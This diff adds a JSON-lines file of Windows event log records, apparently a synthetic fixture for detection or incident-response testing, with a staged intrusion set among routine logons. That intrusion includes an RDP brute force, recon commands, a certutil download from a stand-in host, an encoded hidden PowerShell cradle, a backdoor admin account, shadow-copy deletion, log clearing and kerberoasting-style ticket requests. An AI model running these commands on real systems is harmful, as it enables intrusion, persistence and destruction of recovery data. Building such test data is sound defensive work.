@@ -1,0 +1,74 @@
+{"Id":4624,"TimeCreated":"2026-03-14T00:10:00.000Z","MachineName":"SRV-DC-01","RecordId":1027,"EventData":{"TargetUserName":"svc-backup","IpAddress":"10.20.0.10","LogonType":"3"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T00:16:03.000Z","MachineName":"WS-FIN-07","RecordId":1028,"EventData":{"TargetUserName":"jlopez","IpAddress":"10.20.0.11","LogonType":"2"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T00:22:06.000Z","MachineName":"SRV-DC-01","RecordId":1029,"EventData":{"TargetUserName":"svc-backup","IpAddress":"10.20.0.12","LogonType":"3"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T00:28:09.000Z","MachineName":"WS-FIN-07","RecordId":1030,"EventData":{"TargetUserName":"jlopez","IpAddress":"10.20.0.13","LogonType":"2"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T00:34:12.000Z","MachineName":"SRV-DC-01","RecordId":1031,"EventData":{"TargetUserName":"svc-backup","IpAddress":"10.20.0.14","LogonType":"3"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T00:40:15.000Z","MachineName":"WS-FIN-07","RecordId":1032,"EventData":{"TargetUserName":"jlopez","IpAddress":"10.20.0.10","LogonType":"2"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T00:46:18.000Z","MachineName":"SRV-DC-01","RecordId":1033,"EventData":{"TargetUserName":"svc-backup","IpAddress":"10.20.0.11","LogonType":"3"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T00:52:21.000Z","MachineName":"WS-FIN-07","RecordId":1034,"EventData":{"TargetUserName":"jlopez","IpAddress":"10.20.0.12","LogonType":"2"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T00:58:24.000Z","MachineName":"SRV-DC-01","RecordId":1035,"EventData":{"TargetUserName":"svc-backup","IpAddress":"10.20.0.13","LogonType":"3"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T01:04:27.000Z","MachineName":"WS-FIN-07","RecordId":1036,"EventData":{"TargetUserName":"jlopez","IpAddress":"10.20.0.14","LogonType":"2"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T01:10:30.000Z","MachineName":"SRV-DC-01","RecordId":1037,"EventData":{"TargetUserName":"svc-backup","IpAddress":"10.20.0.10","LogonType":"3"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T01:16:33.000Z","MachineName":"WS-FIN-07","RecordId":1038,"EventData":{"TargetUserName":"jlopez","IpAddress":"10.20.0.11","LogonType":"2"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T01:22:36.000Z","MachineName":"SRV-DC-01","RecordId":1039,"EventData":{"TargetUserName":"svc-backup","IpAddress":"10.20.0.12","LogonType":"3"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T01:28:39.000Z","MachineName":"WS-FIN-07","RecordId":1040,"EventData":{"TargetUserName":"jlopez","IpAddress":"10.20.0.13","LogonType":"2"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T01:34:42.000Z","MachineName":"SRV-DC-01","RecordId":1041,"EventData":{"TargetUserName":"svc-backup","IpAddress":"10.20.0.14","LogonType":"3"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T01:40:45.000Z","MachineName":"WS-FIN-07","RecordId":1042,"EventData":{"TargetUserName":"jlopez","IpAddress":"10.20.0.10","LogonType":"2"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T01:46:48.000Z","MachineName":"SRV-DC-01","RecordId":1043,"EventData":{"TargetUserName":"svc-backup","IpAddress":"10.20.0.11","LogonType":"3"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T01:52:51.000Z","MachineName":"WS-FIN-07","RecordId":1044,"EventData":{"TargetUserName":"jlopez","IpAddress":"10.20.0.12","LogonType":"2"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T01:58:54.000Z","MachineName":"SRV-DC-01","RecordId":1045,"EventData":{"TargetUserName":"svc-backup","IpAddress":"10.20.0.13","LogonType":"3"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T02:04:57.000Z","MachineName":"WS-FIN-07","RecordId":1046,"EventData":{"TargetUserName":"jlopez","IpAddress":"10.20.0.14","LogonType":"2"},"Message":""}
+{"Id":4625,"TimeCreated":"2026-03-14T02:10:00.000Z","MachineName":"WS-FIN-07","RecordId":1000,"EventData":{"TargetUserName":"jlopez","IpAddress":"203.0.113.45","LogonType":"10"},"Message":""}
+{"Id":4625,"TimeCreated":"2026-03-14T02:10:09.000Z","MachineName":"WS-FIN-07","RecordId":1001,"EventData":{"TargetUserName":"administrator","IpAddress":"203.0.113.45","LogonType":"10"},"Message":""}
+{"Id":4625,"TimeCreated":"2026-03-14T02:10:18.000Z","MachineName":"WS-FIN-07","RecordId":1002,"EventData":{"TargetUserName":"administrator","IpAddress":"203.0.113.45","LogonType":"10"},"Message":""}
+{"Id":4625,"TimeCreated":"2026-03-14T02:10:27.000Z","MachineName":"WS-FIN-07","RecordId":1003,"EventData":{"TargetUserName":"jlopez","IpAddress":"203.0.113.45","LogonType":"10"},"Message":""}
+{"Id":4625,"TimeCreated":"2026-03-14T02:10:36.000Z","MachineName":"WS-FIN-07","RecordId":1004,"EventData":{"TargetUserName":"administrator","IpAddress":"203.0.113.45","LogonType":"10"},"Message":""}
+{"Id":4625,"TimeCreated":"2026-03-14T02:10:45.000Z","MachineName":"WS-FIN-07","RecordId":1005,"EventData":{"TargetUserName":"administrator","IpAddress":"203.0.113.45","LogonType":"10"},"Message":""}
+{"Id":4625,"TimeCreated":"2026-03-14T02:10:54.000Z","MachineName":"WS-FIN-07","RecordId":1006,"EventData":{"TargetUserName":"jlopez","IpAddress":"203.0.113.45","LogonType":"10"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T02:11:00.000Z","MachineName":"SRV-DC-01","RecordId":1047,"EventData":{"TargetUserName":"svc-backup","IpAddress":"10.20.0.10","LogonType":"3"},"Message":""}
+{"Id":4625,"TimeCreated":"2026-03-14T02:11:03.000Z","MachineName":"WS-FIN-07","RecordId":1007,"EventData":{"TargetUserName":"administrator","IpAddress":"203.0.113.45","LogonType":"10"},"Message":""}
+{"Id":4625,"TimeCreated":"2026-03-14T02:11:12.000Z","MachineName":"WS-FIN-07","RecordId":1008,"EventData":{"TargetUserName":"administrator","IpAddress":"203.0.113.45","LogonType":"10"},"Message":""}
+{"Id":4625,"TimeCreated":"2026-03-14T02:11:21.000Z","MachineName":"WS-FIN-07","RecordId":1009,"EventData":{"TargetUserName":"jlopez","IpAddress":"203.0.113.45","LogonType":"10"},"Message":""}
+{"Id":4625,"TimeCreated":"2026-03-14T02:11:30.000Z","MachineName":"WS-FIN-07","RecordId":1010,"EventData":{"TargetUserName":"administrator","IpAddress":"203.0.113.45","LogonType":"10"},"Message":""}
+{"Id":4625,"TimeCreated":"2026-03-14T02:11:39.000Z","MachineName":"WS-FIN-07","RecordId":1011,"EventData":{"TargetUserName":"administrator","IpAddress":"203.0.113.45","LogonType":"10"},"Message":""}
+{"Id":4625,"TimeCreated":"2026-03-14T02:11:48.000Z","MachineName":"WS-FIN-07","RecordId":1012,"EventData":{"TargetUserName":"jlopez","IpAddress":"203.0.113.45","LogonType":"10"},"Message":""}
+{"Id":4625,"TimeCreated":"2026-03-14T02:11:57.000Z","MachineName":"WS-FIN-07","RecordId":1013,"EventData":{"TargetUserName":"administrator","IpAddress":"203.0.113.45","LogonType":"10"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T02:12:20.000Z","MachineName":"WS-FIN-07","RecordId":1014,"EventData":{"TargetUserName":"jlopez","IpAddress":"203.0.113.45","LogonType":"10"},"Message":""}
+{"Id":4688,"TimeCreated":"2026-03-14T02:14:05.000Z","MachineName":"WS-FIN-07","RecordId":1015,"EventData":{"SubjectUserName":"jlopez","NewProcessName":"C:\\Windows\\System32\\whoami.exe","CommandLine":"whoami /all"},"Message":""}
+{"Id":4688,"TimeCreated":"2026-03-14T02:14:30.000Z","MachineName":"WS-FIN-07","RecordId":1016,"EventData":{"SubjectUserName":"jlopez","CommandLine":"net user"},"Message":""}
+{"Id":4688,"TimeCreated":"2026-03-14T02:14:55.000Z","MachineName":"WS-FIN-07","RecordId":1017,"EventData":{"SubjectUserName":"jlopez","CommandLine":"net localgroup administrators"},"Message":""}
+{"Id":4688,"TimeCreated":"2026-03-14T02:15:20.000Z","MachineName":"WS-FIN-07","RecordId":1018,"EventData":{"SubjectUserName":"jlopez","CommandLine":"systeminfo"},"Message":""}
+{"Id":4688,"TimeCreated":"2026-03-14T02:17:00.000Z","MachineName":"WS-FIN-07","RecordId":1019,"EventData":{"SubjectUserName":"jlopez","CommandLine":"certutil -urlcache -f http://198.51.100.9/upd.exe C:\\Users\\Public\\upd.exe"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T02:17:03.000Z","MachineName":"WS-FIN-07","RecordId":1048,"EventData":{"TargetUserName":"jlopez","IpAddress":"10.20.0.11","LogonType":"2"},"Message":""}
+{"Id":4688,"TimeCreated":"2026-03-14T02:18:10.000Z","MachineName":"WS-FIN-07","RecordId":1020,"EventData":{"SubjectUserName":"jlopez","CommandLine":"powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"},"Message":""}
+{"Id":7045,"TimeCreated":"2026-03-14T02:19:40.000Z","MachineName":"WS-FIN-07","RecordId":1021,"EventData":{"ServiceName":"WinUpdSvc","ImagePath":"C:\\Users\\Public\\upd.exe"},"Message":""}
+{"Id":4698,"TimeCreated":"2026-03-14T02:20:15.000Z","MachineName":"WS-FIN-07","RecordId":1022,"EventData":{"SubjectUserName":"jlopez","TaskName":"\\Microsoft\\Windows\\UpdateCheck"},"Message":""}
+{"Id":4720,"TimeCreated":"2026-03-14T02:21:30.000Z","MachineName":"WS-FIN-07","RecordId":1023,"EventData":{"TargetUserName":"support$admin","SubjectUserName":"jlopez"},"Message":""}
+{"Id":4732,"TimeCreated":"2026-03-14T02:21:50.000Z","MachineName":"WS-FIN-07","RecordId":1024,"EventData":{"GroupName":"Administrators","MemberName":"support$admin","SubjectUserName":"jlopez"},"Message":""}
+{"Id":4688,"TimeCreated":"2026-03-14T02:23:00.000Z","MachineName":"WS-FIN-07","RecordId":1025,"EventData":{"SubjectUserName":"jlopez","CommandLine":"vssadmin delete shadows /all /quiet"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T02:23:06.000Z","MachineName":"SRV-DC-01","RecordId":1049,"EventData":{"TargetUserName":"svc-backup","IpAddress":"10.20.0.12","LogonType":"3"},"Message":""}
+{"Id":1102,"TimeCreated":"2026-03-14T02:24:05.000Z","MachineName":"WS-FIN-07","RecordId":1026,"EventData":{"SubjectUserName":"support$admin"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T02:29:09.000Z","MachineName":"WS-FIN-07","RecordId":1050,"EventData":{"TargetUserName":"jlopez","IpAddress":"10.20.0.13","LogonType":"2"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T02:35:12.000Z","MachineName":"SRV-DC-01","RecordId":1051,"EventData":{"TargetUserName":"svc-backup","IpAddress":"10.20.0.14","LogonType":"3"},"Message":""}
+{"Id":4769,"TimeCreated":"2026-03-14T02:40:00.000Z","MachineName":"SRV-DC-01","RecordId":1067,"EventData":{"TargetUserName":"mruiz","ServiceName":"MSSQLSvc/db01","TicketEncryptionType":"0x17"},"Message":""}
+{"Id":4769,"TimeCreated":"2026-03-14T02:40:04.000Z","MachineName":"SRV-DC-01","RecordId":1068,"EventData":{"TargetUserName":"mruiz","ServiceName":"HTTP/db01","TicketEncryptionType":"0x17"},"Message":""}
+{"Id":4769,"TimeCreated":"2026-03-14T02:40:08.000Z","MachineName":"SRV-DC-01","RecordId":1069,"EventData":{"TargetUserName":"mruiz","ServiceName":"CIFS/db01","TicketEncryptionType":"0x17"},"Message":""}
+{"Id":4769,"TimeCreated":"2026-03-14T02:40:12.000Z","MachineName":"SRV-DC-01","RecordId":1070,"EventData":{"TargetUserName":"mruiz","ServiceName":"svc-sql","TicketEncryptionType":"0x17"},"Message":""}
+{"Id":4769,"TimeCreated":"2026-03-14T02:40:16.000Z","MachineName":"SRV-DC-01","RecordId":1071,"EventData":{"TargetUserName":"mruiz","ServiceName":"svc-web","TicketEncryptionType":"0x17"},"Message":""}
+{"Id":4769,"TimeCreated":"2026-03-14T02:40:20.000Z","MachineName":"SRV-DC-01","RecordId":1072,"EventData":{"TargetUserName":"mruiz","ServiceName":"svc-ftp","TicketEncryptionType":"0x17"},"Message":""}
+{"Id":4769,"TimeCreated":"2026-03-14T02:40:24.000Z","MachineName":"SRV-DC-01","RecordId":1073,"EventData":{"TargetUserName":"mruiz","ServiceName":"svc-app","TicketEncryptionType":"0x17"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T02:41:15.000Z","MachineName":"WS-FIN-07","RecordId":1052,"EventData":{"TargetUserName":"jlopez","IpAddress":"10.20.0.10","LogonType":"2"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T02:47:18.000Z","MachineName":"SRV-DC-01","RecordId":1053,"EventData":{"TargetUserName":"svc-backup","IpAddress":"10.20.0.11","LogonType":"3"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T02:53:21.000Z","MachineName":"WS-FIN-07","RecordId":1054,"EventData":{"TargetUserName":"jlopez","IpAddress":"10.20.0.12","LogonType":"2"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T02:59:24.000Z","MachineName":"SRV-DC-01","RecordId":1055,"EventData":{"TargetUserName":"svc-backup","IpAddress":"10.20.0.13","LogonType":"3"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T03:05:27.000Z","MachineName":"WS-FIN-07","RecordId":1056,"EventData":{"TargetUserName":"jlopez","IpAddress":"10.20.0.14","LogonType":"2"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T03:11:30.000Z","MachineName":"SRV-DC-01","RecordId":1057,"EventData":{"TargetUserName":"svc-backup","IpAddress":"10.20.0.10","LogonType":"3"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T03:17:33.000Z","MachineName":"WS-FIN-07","RecordId":1058,"EventData":{"TargetUserName":"jlopez","IpAddress":"10.20.0.11","LogonType":"2"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T03:23:36.000Z","MachineName":"SRV-DC-01","RecordId":1059,"EventData":{"TargetUserName":"svc-backup","IpAddress":"10.20.0.12","LogonType":"3"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T03:29:39.000Z","MachineName":"WS-FIN-07","RecordId":1060,"EventData":{"TargetUserName":"jlopez","IpAddress":"10.20.0.13","LogonType":"2"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T03:35:42.000Z","MachineName":"SRV-DC-01","RecordId":1061,"EventData":{"TargetUserName":"svc-backup","IpAddress":"10.20.0.14","LogonType":"3"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T03:41:45.000Z","MachineName":"WS-FIN-07","RecordId":1062,"EventData":{"TargetUserName":"jlopez","IpAddress":"10.20.0.10","LogonType":"2"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T03:47:48.000Z","MachineName":"SRV-DC-01","RecordId":1063,"EventData":{"TargetUserName":"svc-backup","IpAddress":"10.20.0.11","LogonType":"3"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T03:53:51.000Z","MachineName":"WS-FIN-07","RecordId":1064,"EventData":{"TargetUserName":"jlopez","IpAddress":"10.20.0.12","LogonType":"2"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T03:59:54.000Z","MachineName":"SRV-DC-01","RecordId":1065,"EventData":{"TargetUserName":"svc-backup","IpAddress":"10.20.0.13","LogonType":"3"},"Message":""}
+{"Id":4624,"TimeCreated":"2026-03-14T04:05:57.000Z","MachineName":"WS-FIN-07","RecordId":1066,"EventData":{"TargetUserName":"jlopez","IpAddress":"10.20.0.14","LogonType":"2"},"Message":""}
